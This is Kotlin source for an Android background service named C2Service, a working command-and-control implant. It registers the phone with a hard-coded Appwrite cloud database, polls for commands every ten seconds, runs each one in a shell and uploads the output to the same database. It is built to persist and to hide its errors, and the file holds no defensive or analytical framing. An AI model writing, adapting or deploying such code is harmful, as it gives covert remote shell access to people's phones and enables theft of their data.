package com.sys.service

import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import okhttp3.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.concurrent.TimeUnit

class C2Service : Service() {
    // === APPWRITE CONFIG ===
    private val APPWRITE_URL = "https://sgp.cloud.appwrite.io/v1"
    private val PROJECT_ID = "6b09c77f001ea24e16bd"
    private val DB_ID = "6b09c7cb003058ca1f45" // <- Aapki Poori DB ID
    private val USER_ID = "YOUR_USER_ID" // Build time pe replace hoga
    // ========================

    private val SID = Build.SERIAL + "_" + Build.MODEL
    private var isRunning = true
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            registerDevice()
            while (isRunning) {
                try { pollCommands() } catch (e: Exception) { }
                Thread.sleep(10000)
            }
        }.start()
        return START_STICKY
    }

    private fun headers(): Headers {
        return Headers.Builder()
            .add("X-Appwrite-Project", PROJECT_ID)
            .add("Content-Type", "application/json")
            .build()
    }

    private fun registerDevice() {
        val json = JSONObject().apply {
            put("device_id", SID)
            put("user_id", USER_ID)
            put("model", Build.MODEL)
            put("status", "online")
        }
        
        val req = Request.Builder()
            .url("$APPWRITE_URL/databases/$DB_ID/collections/devices/documents")
            .headers(headers())
            .post(RequestBody.create(MediaType.parse("application/json"), json.toString()))
            .build()
        client.newCall(req).execute().close()
    }

    private fun pollCommands() {
        val url = "$APPWRITE_URL/databases/$DB_ID/collections/commands/documents?queries[]=" + 
                  java.net.URLEncoder.encode("equal(\"device_id\", [\"$SID\"])", "UTF-8")
        
        val req = Request.Builder().url(url).headers(headers()).get().build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) {
                val body = response.body()?.string() ?: return
                try {
                    val arr = JSONObject(body).getJSONArray("documents")
                    for (i in 0 until arr.length()) {
                        val doc = arr.getJSONObject(i)
                        val cmd = doc.getString("command")
                        val output = execCmd(cmd)
                        uploadData("cmd_output", output)
                    }
                } catch (e: Exception) {}
            }
        })
    }

    private fun execCmd(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val reader = BufferedReader(InputStreamReader(p.inputStream))
            val sb = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) { sb.append(line).append("\n") }
            p.waitFor()
            sb.toString()
        } catch (e: Exception) { "error: ${e.message}" }
    }

    private fun uploadData(type: String, content: String) {
        val json = JSONObject().apply {
            put("device_id", SID)
            put("type", type)
            put("content", content)
        }
        val req = Request.Builder()
            .url("$APPWRITE_URL/databases/$DB_ID/collections/results/documents")
            .headers(headers())
            .post(RequestBody.create(MediaType.parse("application/json"), json.toString()))
            .build()
        client.newCall(req).execute().close()
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }
    override fun onBind(intent: Intent?): IBinder? = null
}
